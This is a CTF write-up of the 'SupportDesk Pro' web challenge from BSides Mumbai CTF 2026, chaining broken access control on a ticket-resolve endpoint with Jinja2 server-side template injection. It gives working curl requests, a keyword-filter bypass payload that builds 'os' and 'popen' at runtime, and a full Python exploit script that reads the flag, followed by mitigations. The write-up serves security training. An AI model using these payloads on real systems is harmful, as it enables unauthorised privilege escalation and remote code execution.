---
link: "writeups/bsides-mumbai-2026/supportdesk-pro"
title: "SupportDesk Pro - BSides Mumbai CTF 2026"
description: "Writeup for SupportDesk Pro from BSides Mumbai CTF 2026."
date: 2026-10-01 15:05:00
categories:
  - [Writeups, BSides Mumbai CTF]
tags:
  - BSides Mumbai CTF
  - Web Exploitation
  - Broken Access Control
  - SSTI
  - Jinja2
  - RCE
---

# BSides Mumbai CTF 2026 — SupportDesk Pro

## Challenge Description

> An enterprise incident management portal is handling your onboarding ticket. Something about the way it processes service delegates and resolves tickets doesn't feel quite right.

**URL:** `http://35.238.206.98:1420/`

---

## Overview

This challenge required chaining three distinct vulnerabilities to achieve Remote Code Execution (RCE) on the server and read the flag:

1. **Reconnaissance** — Source code analysis via exposed JavaScript files
2. **Broken Access Control** — Unauthenticated privilege escalation via the ticket resolve endpoint
3. **Server-Side Template Injection (SSTI)** — Jinja2 template injection with filter bypass in the admin report generator

---

## Step 1 — Reconnaissance

### Initial Enumeration

Visiting the root URL presented a **SupportDesk Pro** login/register portal. The first step was to enumerate all client-side JavaScript files:

```plain
GET /static/js/auth.js
GET /static/js/dashboard.js
GET /static/js/tickets.js
GET /static/js/admin.js
```

These files revealed the complete API surface of the application:

| Endpoint                      | Method | Purpose                                             |
| ----------------------------- | ------ | --------------------------------------------------- |
| `/api/v1/auth/register`       | POST   | Register a new user                                 |
| `/api/v1/auth/login`          | POST   | Login, returns JWT                                  |
| `/api/v1/usr/prfl?uid=<uid>`  | GET    | Fetch user profile                                  |
| `/api/v1/tkt/dtl/<ticket_id>` | GET    | Get ticket details                                  |
| `/api/v1/tkt/lst`             | GET    | List all tickets (requires `X-Svc-Delegate` header) |
| `/api/v1/tkt/rsv`             | POST   | Resolve a ticket                                    |
| `/api/v1/adm/rpt/gen`         | POST   | Generate a report (admin only)                      |

### Registering an Account

```bash
curl -s -X POST http://35.238.206.98:1420/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"password123","email":"test@test.com"}'
```

**Response:**

```json
{
  "message": "Account created successfully",
  "ticket_id": "56be6128-b059-45fe-b39c-14d5ff86c2ef",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "uid": "856bbfef-3144-4e72-a095-aae66de2d886"
}
```

Decoding the JWT payload revealed a standard user session:

```json
{
  "uid": "856bbfef-3144-4e72-a095-aae66de2d886",
  "username": "attacker",
  "role": "user",
  "iat": 1790413731,
  "exp": 1790500131
}
```

### Examining the Ticket Resolve Flow

Reading `tickets.js` exposed a critical detail about the intended workflow. The ticket queue (`/api/v1/tkt/lst`) was gated behind an `X-Svc-Delegate` header — a service-level token meant to be obtained separately. The resolve form in turn posted to `/api/v1/tkt/rsv`:

```javascript
// From tickets.js
var res = await fetch("/api/v1/tkt/lst", {
  headers: { "X-Svc-Delegate": svcTk }, // requires special service token
});

// ...
var res = await fetch("/api/v1/tkt/rsv", {
  method: "POST",
  headers: {
    Authorization: "Bearer " + token, // user JWT
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: params.toString(), // ticket_id, action, target_uid
});
```

On success, the resolve endpoint returned a `new_token` — an **admin JWT** — and immediately set it as the session cookie. This was the intended privilege escalation path: a support agent uses a service delegate to list tickets, then resolves one on behalf of a user, granting them elevated access.

The question was: **does `/api/v1/tkt/rsv` actually verify that the caller possesses a valid delegate token?**

---

## Step 2 — Broken Access Control on `/api/v1/tkt/rsv`

### The Bug

The ticket resolve endpoint accepted any valid user Bearer token and granted admin privileges without checking whether the caller had gone through the delegate token flow. The service delegate check was enforced only on the ticket **listing** endpoint, not on the **resolution** endpoint that issued elevated tokens.

### Exploitation

A direct POST to `/api/v1/tkt/rsv` with the registered user's own token and `target_uid` set to their own UID was sufficient:

```bash
curl -s -X POST "http://35.238.206.98:1420/api/v1/tkt/rsv" \
  -H "Authorization: Bearer <USER_JWT>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ticket_id=56be6128-b059-45fe-b39c-14d5ff86c2ef&action=approve&target_uid=856bbfef-3144-4e72-a095-aae66de2d886"
```

**Response:**

```json
{
  "access_level": "admin",
  "message": "Ticket resolved. Account privileges updated.",
  "new_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "redirect": "/portal/admin/reports",
  "status": "approved"
}
```

Decoding the new token:

```json
{
  "uid": "856bbfef-3144-4e72-a095-aae66de2d886",
  "username": "attacker",
  "role": "admin",
  "elevated": true,
  "iat": 1790413832,
  "exp": 1790421032
}
```

**We now had an admin JWT.**

---

## Step 3 — Jinja2 SSTI in the Admin Report Generator

### Discovery

With the admin token, the `/api/v1/adm/rpt/gen` endpoint became accessible. A basic probe confirmed the `report_name` field was rendered as a Jinja2 template:

```bash
curl -s -X POST "http://35.238.206.98:1420/api/v1/adm/rpt/gen" \
  -H "Authorization: Bearer <ADMIN_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"report_name": "{{7*7}}", "format": "html"}'
```

**Response:**

```json
{
  "report": {
    "name": "49"
  }
}
```

`{{7*7}}` evaluated to `49` — **classic Jinja2 SSTI confirmed.**

### The Filter

Attempting a standard RCE payload (`config.__class__.__init__.__globals__["os"].popen(...)`) was blocked:

```json
{
  "error": "Template validation failed",
  "detail": "Report name contains restricted expressions. System call references are not permitted in report titles."
}
```

The server-side blocklist appeared to reject payloads containing keywords such as `os`, `popen`, `system`, and similar system call references.

### Filter Bypass

The filter performed static string matching. Jinja2's `~` operator (string concatenation) allowed splitting blocked keywords into innocuous fragments:

```plain
'o' ~ 's'  →  'os'
'po' ~ 'pen'  →  'popen'
```

Additionally, `cycler` — a built-in Jinja2 utility object — has `os` available in its `__init__.__globals__` dictionary, providing a clean path to the `os` module without ever writing the literal string `os` in the main expression.

The final bypass payload used `{% set %}` blocks to build the forbidden strings at runtime, then used them as dictionary keys:

```jinja2
{% set x='o'+'s' %}
{% set y='po'+'pen' %}
{{ cycler.__init__.__globals__[x][y]('id').read() }}
```

**Result:**

```plain
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

**RCE achieved.**

### Reading the Flag

Listing the root filesystem:

```jinja2
{% set x='o'+'s' %}{% set y='po'+'pen' %}
{{ cycler.__init__.__globals__[x][y]('ls /').read() }}
```

Output included `flag.txt` at `/`. Reading it:

```jinja2
{% set x='o'+'s' %}{% set y='po'+'pen' %}
{{ cycler.__init__.__globals__[x][y]('cat /flag.txt').read() }}
```

---

## Step 4 — Exploit

```python
import json, urllib.request, urllib.error, html
import time

BASE = "http://35.238.206.98:1420"

# Step 1: Register
username = f"attacker_{int(time.time())}"

req = urllib.request.Request(
    f"{BASE}/api/v1/auth/register",
    data=json.dumps({"username": username, "password": "password123", "email": "x@x.com"}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST"
)
reg = json.loads(urllib.request.urlopen(req).read())
user_token = reg["token"]
uid        = reg["uid"]
ticket_id  = reg["ticket_id"]
print(f"[1] Registered: {username}  uid={uid}")

# Step 2: Escalate to admin via broken ticket resolve
body = f"ticket_id={ticket_id}&action=approve&target_uid={uid}".encode()
req = urllib.request.Request(
    f"{BASE}/api/v1/tkt/rsv",
    data=body,
    headers={
        "Authorization": f"Bearer {user_token}",
        "Content-Type": "application/x-www-form-urlencoded"
    },
    method="POST"
)
rsv = json.loads(urllib.request.urlopen(req).read())
admin_token = rsv["new_token"]
print(f"[2] Privilege escalation successful — role: {rsv['access_level']}")

# Step 3: SSTI RCE with filter bypass
def rce(cmd):
    payload = (
        "{%set x='o'+'s'%}"
        "{%set y='po'+'pen'%}"
        f"{{{{cycler.__init__.__globals__[x][y]('{cmd}').read()}}}}"
    )
    req = urllib.request.Request(
        f"{BASE}/api/v1/adm/rpt/gen",
        data=json.dumps({"report_name": payload, "format": "html"}).encode(),
        headers={
            "Authorization": f"Bearer {admin_token}",
            "Content-Type": "application/json"
        },
        method="POST"
    )
    resp = json.loads(urllib.request.urlopen(req).read())
    return html.unescape(resp["report"]["name"])

print(f"[3] RCE — id: {rce('id').strip()}")
flag = rce("cat /flag.txt").strip()
print(f"[4] FLAG: {flag}")
```

**Output:**

```plain
[1] Registered: attacker_1790413730  uid=856bbfef-3144-4e72-a095-aae66de2d886
[2] Privilege escalation successful — role: admin
[3] RCE — id: uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
[4] FLAG: BSides_Mumbai{t1ck3t_3sc4l4t10n_v14_d3l3g4t3_h4nd0ff_sst1_2026}
```
---

## Flag

```plain
BSides_Mumbai{t1ck3t_3sc4l4t10n_v14_d3l3g4t3_h4nd0ff_sst1_2026}
```

---

## Mitigations

| Vulnerability                  | Recommended Fix                                                                                                                                                                                                                                               |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Broken Access Control          | The service delegate token validation must be enforced on **all** endpoints in the resolve flow, not just the listing endpoint. The server should verify that the caller's session is linked to an active, valid delegate token before issuing elevated JWTs. |
| Server-Side Template Injection | Never render user-supplied input as a template. Use the Jinja2 `Environment` with `autoescape=True` and pass user data as **template variables**, not as the template string itself.                                                                          |
| Filter Bypass                  | Blocklists on template content are insufficient as a primary defence. They are easily bypassed via string construction. The only correct fix is to eliminate template rendering of user input entirely.                                                       |

---

## Summary

This challenge perfectly demonstrates how chained vulnerabilities can lead to full system compromise. It starts with reading client-side code to understand the intended API flow, finding a broken access control vulnerability to escalate privileges, and ultimately bypassing a weak SSTI filter using Jinja2 string concatenation to achieve Remote Code Execution.
